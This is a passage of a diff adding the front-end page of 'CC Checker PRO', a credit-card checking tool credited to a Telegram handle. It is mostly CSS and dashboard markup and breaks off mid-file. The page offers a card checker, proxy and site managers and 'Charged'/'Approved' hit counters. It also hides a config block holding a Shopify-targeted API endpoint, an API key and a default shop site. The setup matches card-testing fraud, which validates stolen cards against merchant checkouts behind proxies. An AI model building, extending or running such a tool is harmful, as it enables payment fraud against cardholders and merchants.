@@ -1,0 +1,2591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>CC Checker PRO</title>
+    <link rel="icon" type="image/png" href="MELCKZD.png">
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&family=Poppins:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+
+    <style>
+        :root {
+            --bg-main: radial-gradient(circle at center, #0c081d 0%, #030207 100%);
+            --bg-card: rgba(13, 9, 28, 0.65);
+            --bg-input: rgba(4, 2, 8, 0.7);
+            --accent-glow: rgba(0, 172, 238, 0.4);
+            --color-primary: #00acee;
+            --color-cyan: #00ffff;
+            --color-success: #00ff66;
+            --color-purple: #cc66ff;
+            --color-danger: #ff3366;
+            --color-warning: #ffcc00;
+            --color-gold: #ffd700;
+            --text-main: #e2e8f0;
+            --text-muted: #8e8a9f;
+            --text-pure: #ffffff;
+            --border-glass: 1px solid rgba(255, 255, 255, 0.05);
+            --border-accent: 1px solid rgba(0, 172, 238, 0.25);
+            --shadow-premium: 0 12px 40px 0 rgba(0, 0, 0, 0.6);
+            --transition-fast: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            --sidebar-width: 220px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            scrollbar-width: thin;
+            scrollbar-color: #1a1435 transparent;
+        }
+
+        body,
+        html {
+            width: 100%;
+            min-height: 100vh;
+            background: var(--bg-main);
+            color: var(--text-main);
+            font-family: 'Poppins', sans-serif;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            width: clamp(250px, 40vw, 500px);
+            height: clamp(250px, 40vw, 500px);
+            background: rgba(138, 43, 226, 0.12);
+            border-radius: 50%;
+            filter: blur(140px);
+            top: 15%;
+            left: 15%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .app-container {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            min-height: 100vh;
+            max-width: 100vw;
+        }
+
+        /* ===== SIDEBAR ===== */
+        .sidebar {
+            width: var(--sidebar-width);
+            min-width: var(--sidebar-width);
+            background: rgba(4, 2, 8, 0.7);
+            border-right: var(--border-glass);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            padding: 16px 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            height: 100vh;
+            position: sticky;
+            top: 0;
+            overflow-y: auto;
+        }
+
+        .sidebar::-webkit-scrollbar {
+            width: 3px;
+        }
+        .sidebar::-webkit-scrollbar-thumb {
+            background: #1b143c;
+            border-radius: 10px;
+        }
+
+        .sidebar-brand {
+            text-align: center;
+            padding-bottom: 12px;
+            border-bottom: var(--border-glass);
+        }
+
+        .sidebar-brand h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: var(--text-pure);
+            letter-spacing: 1px;
+        }
+
+        .sidebar-brand h2 a {
+            color: var(--color-primary);
+            text-decoration: none;
+        }
+
+        .sidebar-brand small {
+            display: block;
+            font-size: 0.55rem;
+            color: var(--text-muted);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 2px;
+        }
+
+        .sidebar-section {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .sidebar-section-title {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.6rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text-muted);
+            padding: 4px 8px;
+            border-radius: 4px;
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 12px;
+            border-radius: 8px;
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.75rem;
+            font-weight: 500;
+            transition: var(--transition-fast);
+            cursor: pointer;
+            border: none;
+            background: transparent;
+            width: 100%;
+            text-align: left;
+        }
+
+        .sidebar-item:hover {
+            background: rgba(255, 255, 255, 0.04);
+            color: var(--text-pure);
+        }
+
+        .sidebar-item.active {
+            background: rgba(0, 172, 238, 0.12);
+            color: var(--color-primary);
+            border-left: 2px solid var(--color-primary);
+        }
+
+        .sidebar-item i {
+            width: 18px;
+            text-align: center;
+            font-size: 0.85rem;
+        }
+
+        .sidebar-item .badge-side {
+            margin-left: auto;
+            font-size: 0.55rem;
+            background: rgba(255, 255, 255, 0.06);
+            padding: 1px 8px;
+            border-radius: 10px;
+            color: var(--text-muted);
+        }
+
+        /* ===== MAIN CONTENT ===== */
+        .main-content {
+            flex: 1;
+            padding: 12px 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            min-width: 0;
+            overflow-x: hidden;
+        }
+
+        header {
+            text-align: center;
+            padding-bottom: 2px;
+        }
+
+        header h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: clamp(1rem, 2vw, 1.3rem);
+            font-weight: 700;
+            letter-spacing: 3px;
+            color: var(--text-pure);
+            text-shadow: 0 0 12px var(--accent-glow);
+        }
+
+        header h1 a {
+            color: var(--color-primary);
+            text-decoration: none;
+            transition: var(--transition-fast);
+        }
+
+        header h1 a:hover {
+            color: #00e5ff;
+            text-shadow: 0 0 15px #00e5ff;
+        }
+
+        /* ===== HIDDEN API ===== */
+        .api-config-hidden {
+            display: none;
+        }
+
+        /* ===== DASHBOARD STATS ===== */
+        .dashboard-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 8px;
+            background: var(--bg-card);
+            border: var(--border-glass);
+            border-radius: 14px;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            box-shadow: var(--shadow-premium);
+            padding: 12px 16px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-item .stat-icon {
+            font-size: 1rem;
+            display: block;
+        }
+
+        .stat-item .stat-value {
+            font-family: 'Fira Code', monospace;
+            font-size: 1.2rem;
+            font-weight: 700;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .stat-item .stat-label {
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--text-muted);
+            display: block;
+            margin-top: 1px;
+        }
+
+        .stat-gold .stat-value {
+            color: var(--color-gold);
+        }
+        .stat-green .stat-value {
+            color: var(--color-success);
+        }
+        .stat-cyan .stat-value {
+            color: var(--color-cyan);
+        }
+        .stat-blue .stat-value {
+            color: var(--color-primary);
+        }
+        .stat-purple .stat-value {
+            color: var(--color-purple);
+        }
+
+        .stat-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .status-dot.waiting {
+            background: var(--color-warning);
+        }
+        .status-dot.running {
+            background: #00e5ff;
+            animation: pulse 1s infinite;
+        }
+        .status-dot.stopped {
+            background: var(--color-danger);
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        /* ===== MANAGER CARDS ===== */
+        .manager-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .manager-card {
+            background: var(--bg-card);
+            border: var(--border-glass);
+            border-radius: 14px;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            box-shadow: var(--shadow-premium);
+            padding: 12px 14px;
+            transition: border-color 0.3s ease;
+            overflow: hidden;
+        }
+
+        .manager-card:hover {
+            border-color: rgba(255, 255, 255, 0.08);
+        }
+
+        .manager-title {
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            font-size: 0.8rem;
+            color: var(--text-pure);
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .manager-title i {
+            color: var(--color-primary);
+        }
+
+        .manager-title .count-badge {
+            font-size: 0.6rem;
+            background: rgba(255, 255, 255, 0.06);
+            padding: 1px 10px;
+            border-radius: 10px;
+            color: var(--text-muted);
+            margin-left: auto;
+        }
+
+        .manager-controls {
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+            margin-bottom: 8px;
+        }
+
+        .manager-input {
+            flex: 1;
+            min-width: 120px;
+            background: var(--bg-input);
+            border: var(--border-accent);
+            border-radius: 6px;
+            padding: 6px 10px;
+            color: var(--text-pure);
+            font-family: 'Poppins', sans-serif;
+            font-size: 0.7rem;
+            outline: none;
+            transition: var(--transition-fast);
+        }
+
+        .manager-input:focus {
+            border-color: var(--color-primary);
+            box-shadow: 0 0 12px rgba(0, 172, 238, 0.2);
+        }
+
+        .manager-input::placeholder {
+            color: var(--text-muted);
+            opacity: 0.5;
+        }
+
+        .manager-btn {
+            padding: 5px 12px;
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            font-size: 0.6rem;
+            letter-spacing: 0.5px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            color: var(--text-pure);
+            text-transform: uppercase;
+            transition: var(--transition-fast);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            white-space: nowrap;
+        }
+
+        .manager-btn:hover {
+            filter: brightness(1.15);
+            transform: translateY(-1px);
+        }
+        .manager-btn:active {
+            transform: translateY(1px);
+        }
+
+        .btn-add {
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+        }
+        .btn-upload {
+            background: linear-gradient(135deg, #6f42c1, #4a2a8a);
+        }
+        .btn-test {
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+        }
+        .btn-remove {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+        }
+        .btn-clear-mgr {
+            background: linear-gradient(135deg, #4a455e, #2d2a3a);
+        }
+
+        .manager-table-wrap {
+            max-height: 150px;
+            overflow-y: auto;
+            border-radius: 8px;
+            border: var(--border-glass);
+        }
+
+        .manager-table-wrap::-webkit-scrollbar {
+            width: 4px;
+        }
+        .manager-table-wrap::-webkit-scrollbar-thumb {
+            background: #1b143c;
+            border-radius: 10px;
+        }
+
+        .manager-table {
+            width: 100%;
+            font-size: 0.65rem;
+            border-collapse: collapse;
+        }
+
+        .manager-table th {
+            background: rgba(4, 2, 8, 0.6);
+            color: var(--text-muted);
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            padding: 4px 6px;
+            text-align: left;
+            position: sticky;
+            top: 0;
+            z-index: 2;
+            font-size: 0.55rem;
+        }
+
+        .manager-table td {
+            padding: 4px 6px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.6rem;
+            color: var(--text-main);
+            word-break: break-all;
+        }
+
+        .manager-table tr:hover td {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .status-badge {
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-size: 0.5rem;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .status-alive {
+            background: rgba(0, 255, 102, 0.15);
+            color: var(--color-success);
+        }
+        .status-dead {
+            background: rgba(255, 51, 102, 0.15);
+            color: var(--color-danger);
+        }
+        .status-unknown {
+            background: rgba(255, 204, 0, 0.15);
+            color: var(--color-warning);
+        }
+
+        .score-fast {
+            color: var(--color-success);
+        }
+        .score-medium {
+            color: var(--color-warning);
+        }
+        .score-slow {
+            color: var(--color-danger);
+        }
+        .score-unknown {
+            color: var(--text-muted);
+        }
+
+        .manager-actions {
+            display: flex;
+            gap: 3px;
+        }
+
+        .action-icon {
+            width: 18px;
+            height: 18px;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.5rem;
+            transition: var(--transition-fast);
+            color: var(--text-pure);
+        }
+
+        .action-icon:hover {
+            filter: brightness(1.2);
+            transform: scale(1.1);
+        }
+        .action-icon-del {
+            background: rgba(255, 51, 102, 0.3);
+        }
+        .action-icon-del:hover {
+            background: rgba(255, 51, 102, 0.6);
+        }
+        .action-icon-test {
+            background: rgba(0, 198, 255, 0.2);
+        }
+        .action-icon-test:hover {
+            background: rgba(0, 198, 255, 0.4);
+        }
+
+        /* ===== WORKSPACE ===== */
+        .workspace {
+            display: grid;
+            grid-template-columns: 1.8fr 1.2fr;
+            gap: 10px;
+            min-height: 250px;
+        }
+
+        .panel-left,
+        .panel-right {
+            display: flex;
+            flex-direction: column;
+            min-height: 0;
+        }
+
+        .card {
+            background: var(--bg-card);
+            border: var(--border-glass);
+            border-radius: 14px;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            box-shadow: var(--shadow-premium);
+            padding: 14px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            min-height: 0;
+            transition: border-color 0.3s ease;
+        }
+
+        .card:hover {
+            border-color: rgba(255, 255, 255, 0.08);
+        }
+
+        .form-checker {
+            width: 100%;
+            flex-grow: 1;
+            background: var(--bg-input);
+            border: var(--border-accent);
+            border-radius: 10px;
+            color: #00ffcc;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            line-height: 1.2;
+            padding: 10px;
+            resize: none;
+            outline: none;
+            text-align: center;
+            transition: var(--transition-fast);
+            user-select: text;
+            box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.8);
+            min-height: 120px;
+        }
+
+        .form-checker:focus {
+            border-color: var(--color-primary);
+            box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.8), 0 0 12px rgba(0, 172, 238, 0.3);
+        }
+
+        .control-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 8px 0;
+            flex-wrap: wrap;
+        }
+
+        .selector-dropdown {
+            flex: 1;
+            min-width: 100px;
+            background: #090614;
+            color: var(--text-pure);
+            border: var(--border-glass);
+            border-radius: 8px;
+            padding: 8px 12px;
+            font-size: 0.75rem;
+            font-family: 'Poppins', sans-serif;
+            outline: none;
+            cursor: pointer;
+            transition: var(--transition-fast);
+            text-align: center;
+            appearance: none;
+            -webkit-appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%238e8a9f' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: calc(100% - 12px) center;
+        }
+
+        .btn-container {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            padding: 8px 14px;
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            font-size: 0.65rem;
+            letter-spacing: 0.5px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: var(--text-pure);
+            text-transform: uppercase;
+            transition: var(--transition-fast);
+            flex: 1;
+            min-width: 50px;
+        }
+
+        .btn-play {
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            box-shadow: 0 4px 15px rgba(0, 198, 255, 0.25);
+        }
+        .btn-play:hover:not(:disabled) {
+            box-shadow: 0 4px 20px rgba(0, 198, 255, 0.5);
+            filter: brightness(1.1);
+            transform: translateY(-1px);
+        }
+
+        .btn-stop {
+            background: linear-gradient(135deg, #f857a6, #ff5858);
+            box-shadow: 0 4px 15px rgba(248, 87, 166, 0.25);
+        }
+        .btn-stop:hover:not(:disabled) {
+            box-shadow: 0 4px 20px rgba(248, 87, 166, 0.5);
+            filter: brightness(1.1);
+            transform: translateY(-1px);
+        }
+
+        .btn-paste {
+            background: linear-gradient(135deg, #1f943c, #176e2c);
+            flex: 0.4;
+        }
+        .btn-file {
+            background: linear-gradient(135deg, #6f42c1, #4a2a8a);
+            flex: 0.4;
+        }
+
+        .btn:disabled {
+            background: #1b172a !important;
+            box-shadow: none !important;
+            color: #4a455e !important;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* ===== TABS ===== */
+        .tabs-navigation {
+            display: flex;
+            gap: 6px;
+            background: rgba(4, 2, 8, 0.4);
+            padding: 4px;
+            border-radius: 10px;
+            border: var(--border-glass);
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 8px 10px;
+            color: var(--text-muted);
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.65rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            border-radius: 7px;
+            cursor: pointer;
+            transition: var(--transition-fast);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            text-transform: uppercase;
+            min-width: 60px;
+        }
+
+        .tab-btn:hover {
+            color: var(--text-pure);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .tab-btn.active-tab {
+            background: #191336;
+            color: #00e5ff;
+            box-shadow: inset 0 0 10px rgba(0, 229, 255, 0.1), 0 2px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        .results-board {
+            flex: 1;
+            min-height: 0;
+            height: auto;
+        }
+
+        .results-wrapper {
+            display: none;
+            height: 100%;
+            flex-direction: column;
+        }
+
+        .results-wrapper.active-wrapper {
+            display: flex;
+        }
+
+        .results-header-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: -6px;
+            margin-bottom: 3px;
+            font-size: 0.65rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        .action-icons-group {
+            display: flex;
+            gap: 4px;
+        }
+
+        .action-ico {
+            background: #100c24;
+            border: var(--border-glass);
+            color: var(--text-muted);
+            width: 22px;
+            height: 22px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 0.65rem;
+            transition: var(--transition-fast);
+        }
+
+        .action-ico:hover {
+            color: var(--text-pure);
+            background: #1b143b;
+            border-color: var(--color-primary);
+        }
+
+        .results-logs-container {
+            flex: 1;
+            min-height: 0;
+            height: auto;
+            overflow-y: auto;
+            background: var(--bg-input);
+            border: var(--border-glass);
+            border-radius: 8px;
+            padding: 8px 10px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.7rem;
+            white-space: pre-wrap;
+            user-select: text;
+            box-shadow: inset 0 4px 12px rgba(0, 0, 0, 0.9);
+            max-height: 200px;
+        }
+
+        .results-logs-container::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        .results-logs-container::-webkit-scrollbar-thumb {
+            background: #1b143c;
+            border-radius: 10px;
+        }
+        .results-logs-container::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .log-line {
+            display: block;
+            line-height: 1.3;
+            margin-bottom: 2px;
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-weight: 500;
+            width: 100%;
+            user-select: text;
+            animation: slideInLog 0.2s ease-out;
+            word-break: break-all;
+            font-size: 0.65rem;
+        }
+        @keyframes slideInLog {
+            from {
+                opacity: 0;
+                transform: translateX(-4px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .log-charged {
+            background: rgba(255, 215, 0, 0.1);
+            color: var(--color-gold);
+            border-left: 3px solid var(--color-gold);
+        }
+        .log-approved {
+            background: rgba(0, 255, 102, 0.08);
+            color: var(--color-success);
+            border-left: 3px solid var(--color-success);
+        }
+        .log-declined {
+            background: rgba(255, 51, 102, 0.04);
+            color: var(--color-danger);
+            opacity: 0.75;
+            border-left: 3px solid rgba(255, 51, 102, 0.2);
+        }
+        .log-error {
+            background: rgba(255, 204, 0, 0.08);
+            color: var(--color-warning);
+            border-left: 3px solid var(--color-warning);
+        }
+        .log-site-error {
+            background: rgba(255, 100, 0, 0.08);
+            color: #ff8844;
+            border-left: 3px solid #ff8844;
+        }
+        .log-hit {
+            background: rgba(204, 102, 255, 0.08);
+            color: var(--color-purple);
+            border-left: 3px solid var(--color-purple);
+            cursor: pointer;
+        }
+        .log-hit:hover {
+            background: rgba(204, 102, 255, 0.15);
+        }
+        .log-detail {
+            background: rgba(0, 172, 238, 0.06);
+            color: var(--color-cyan);
+            border-left: 3px solid var(--color-cyan);
+            font-size: 0.6rem;
+            opacity: 0.8;
+            padding: 2px 8px;
+            margin-left: 10px;
+            border-radius: 3px;
+        }
+
+        /* ===== DEBUG CONSOLE ===== */
+        .debug-console {
+            background: var(--bg-card);
+            border: var(--border-glass);
+            border-radius: 14px;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            box-shadow: var(--shadow-premium);
+            padding: 10px 14px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .debug-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .debug-title {
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .debug-title i {
+            color: var(--color-primary);
+        }
+
+        .debug-actions {
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+        }
+
+        .debug-btn {
+            padding: 4px 12px;
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            font-size: 0.6rem;
+            letter-spacing: 0.5px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            color: var(--text-pure);
+            text-transform: uppercase;
+            transition: var(--transition-fast);
+        }
+
+        .debug-btn:hover {
+            filter: brightness(1.15);
+            transform: translateY(-1px);
+        }
+
+        .debug-btn-test {
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+        }
+        .debug-btn-clear {
+            background: linear-gradient(135deg, #4a455e, #2d2a3a);
+        }
+        .debug-btn-copy {
+            background: linear-gradient(135deg, #1f943c, #176e2c);
+        }
+
+        .debug-output {
+            background: rgba(4, 2, 8, 0.8);
+            border: var(--border-glass);
+            border-radius: 8px;
+            padding: 6px 10px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.65rem;
+            color: var(--text-main);
+            max-height: 120px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            line-height: 1.5;
+            user-select: text;
+        }
+
+        .debug-output::-webkit-scrollbar {
+            width: 4px;
+        }
+        .debug-output::-webkit-scrollbar-thumb {
+            background: #1b143c;
+            border-radius: 10px;
+        }
+
+        .debug-line {
+            display: block;
+            opacity: 0.9;
+            padding: 1px 0;
+        }
+        .debug-line.info {
+            color: var(--color-cyan);
+        }
+        .debug-line.success {
+            color: var(--color-success);
+        }
+        .debug-line.error {
+            color: var(--color-danger);
+        }
+        .debug-line.warning {
+            color: var(--color-warning);
+        }
+        .debug-line.gold {
+            color: var(--color-gold);
+        }
+        .debug-line.purple {
+            color: var(--color-purple);
+        }
+        .debug-line.detail {
+            color: #88aacc;
+            font-size: 0.6rem;
+            opacity: 0.7;
+            padding-left: 15px;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 1024px) {
+            :root {
+                --sidebar-width: 60px;
+            }
+            .sidebar-brand h2 {
+                font-size: 0;
+            }
+            .sidebar-brand h2 a {
+                font-size: 1.2rem;
+            }
+            .sidebar-brand small {
+                display: none;
+            }
+            .sidebar-item span:not(.badge-side) {
+                display: none;
+            }
+            .sidebar-item {
+                justify-content: center;
+                padding: 10px;
+            }
+            .sidebar-item .badge-side {
+                display: none;
+            }
+            .sidebar-item i {
+                font-size: 1.1rem;
+                margin: 0;
+            }
+            .sidebar-section-title {
+                text-align: center;
+                font-size: 0.5rem;
+            }
+            .manager-section {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            :root {
+                --sidebar-width: 50px;
+            }
+            .sidebar {
+                padding: 10px 6px;
+            }
+            .main-content {
+                padding: 8px 10px;
+            }
+            .workspace {
+                grid-template-columns: 1fr;
+            }
+            .dashboard-stats {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 4px;
+                padding: 8px 10px;
+            }
+            .stat-item .stat-value {
+                font-size: 1rem;
+            }
+            .stat-item .stat-label {
+                font-size: 0.5rem;
+            }
+            .tabs-navigation {
+                display: grid;
+                grid-template-columns: repeat(3, 1fr);
+                gap: 4px;
+            }
+            .tab-btn {
+                font-size: 0.55rem;
+                padding: 6px;
+            }
+            .manager-controls {
+                flex-wrap: wrap;
+            }
+            .manager-input {
+                min-width: 80px;
+                font-size: 0.6rem;
+            }
+            .manager-btn {
+                font-size: 0.55rem;
+                padding: 4px 8px;
+            }
+            .results-logs-container {
+                max-height: 150px;
+                font-size: 0.6rem;
+            }
+            .debug-output {
+                max-height: 80px;
+                font-size: 0.6rem;
+            }
+            header h1 {
+                font-size: 0.9rem;
+            }
+            .btn {
+                font-size: 0.55rem;
+                padding: 6px 10px;
+            }
+            .sidebar-item i {
+                font-size: 0.9rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .dashboard-stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .tabs-navigation {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .manager-section {
+                grid-template-columns: 1fr;
+            }
+            .stat-item .stat-value {
+                font-size: 0.85rem;
+            }
+            .sidebar {
+                width: 40px;
+                min-width: 40px;
+                padding: 6px 4px;
+            }
+            .sidebar-item {
+                padding: 6px;
+            }
+            .sidebar-item i {
+                font-size: 0.8rem;
+            }
+            .sidebar-section-title {
+                font-size: 0.4rem;
+            }
+            .main-content {
+                padding: 4px 6px;
+                gap: 6px;
+            }
+            .card {
+                padding: 8px 10px;
+            }
+            .form-checker {
+                min-height: 80px;
+                font-size: 0.65rem;
+                padding: 6px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="app-container">
+
+        <!-- ===== SIDEBAR ===== -->
+        <nav class="sidebar">
+            <div class="sidebar-brand">
+                <h2><a href="#">🚀</a></h2>
+                <small>CC PRO</small>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-section-title">Navigation</div>
+                <button class="sidebar-item active" data-section="dashboard">
+                    <i class="fas fa-chart-pie"></i>
+                    <span>Dashboard</span>
+                    <span class="badge-side">Stats</span>
+                </button>
+                <button class="sidebar-item" data-section="proxies">
+                    <i class="fas fa-network-wired"></i>
+                    <span>Proxy Manager</span>
+                    <span class="badge-side" id="proxyCount">0</span>
+                </button>
+                <button class="sidebar-item" data-section="sites">
+                    <i class="fas fa-globe"></i>
+                    <span>Site Manager</span>
+                    <span class="badge-side" id="siteCount">0</span>
+                </button>
+                <button class="sidebar-item" data-section="checker">
+                    <i class="fas fa-credit-card"></i>
+                    <span>Card Checker</span>
+                    <span class="badge-side">Go</span>
+                </button>
+                <button class="sidebar-item" data-section="logs">
+                    <i class="fas fa-list-ul"></i>
+                    <span>Logs</span>
+                    <span class="badge-side">View</span>
+                </button>
+            </div>
+
+            <div class="sidebar-section" style="margin-top:auto;border-top:var(--border-glass);padding-top:10px;">
+                <div class="sidebar-section-title">System</div>
+                <button class="sidebar-item" onclick="testAPI()">
+                    <i class="fas fa-vial"></i>
+                    <span>Test API</span>
+                </button>
+                <button class="sidebar-item" onclick="clearAllData()">
+                    <i class="fas fa-trash-alt"></i>
+                    <span>Clear Data</span>
+                </button>
+            </div>
+        </nav>
+
+        <!-- ===== MAIN CONTENT ===== -->
+        <div class="main-content">
+
+            <header>
+                <h1>🚀 CC CHECKER PRO BY <a href="https://t.me/melckzd" target="_blank" rel="noopener">@MELCKZD</a></h1>
+            </header>
+
+            <!-- ===== HIDDEN API ===== -->
+            <div class="api-config-hidden">
+                <input type="text" id="apiUrl" value="https://api-production-6b6d.up.railway.app/shopify">
+                <input type="text" id="apiKey" value="darkanon">
+                <input type="text" id="proxyInput" value="">
+                <input type="text" id="siteInput" value="https://lebzone.com">
+            </div>
+
+            <!-- ===== SECTION: DASHBOARD ===== -->
+            <div id="section-dashboard" class="section-content">
+                <div class="dashboard-stats">
+                    <div class="stat-item stat-gold">
+                        <span class="stat-icon">💰</span>
+                        <span class="stat-value count-charged">0</span>
+                        <span class="stat-label">Charged</span>
+                    </div>
+                    <div class="stat-item stat-green">
+                        <span class="stat-icon">✅</span>
+                        <span class="stat-value count-approved">0</span>
+                        <span class="stat-label">Approved</span>
+                    </div>
+                    <div class="stat-item stat-cyan">
+                        <span class="stat-icon">📊</span>
+                        <span class="stat-value count-tested">0</span>
+                        <span class="stat-label">Checked</span>
+                    </div>
+                    <div class="stat-item stat-blue">
+                        <span class="stat-icon">📥</span>
+                        <span class="stat-value count-loaded">0</span>
+                        <span class="stat-label">Loaded</span>
+                    </div>
+                    <div class="stat-item stat-purple">
+                        <span class="stat-icon">🏆</span>
+                        <span class="stat-value count-hits">0</span>
+                        <span class="stat-label">Total Hits</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-icon">⏳</span>
+                        <span class="stat-value" style="font-size:0.8rem;display:flex;align-items:center;justify-content:center;gap:6px;">
+                            <span class="status-dot waiting" id="statusDot"></span>
+                            <span id="statusText">Waiting</span>
+                        </span>
+                        <span class="stat-label">Status</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== SECTION: PROXY MANAGER ===== -->
+            <div id="section-proxies" class="section-content" style="display:none;">
+                <div class="manager-card">
+                    <div class="manager-title">
+                        <i class="fas fa-network-wired"></i> Proxy Manager
+                        <span class="count-badge" id="proxyCountBadge">0 proxies</span>
+                    </div>
+                    <div class="manager-controls">
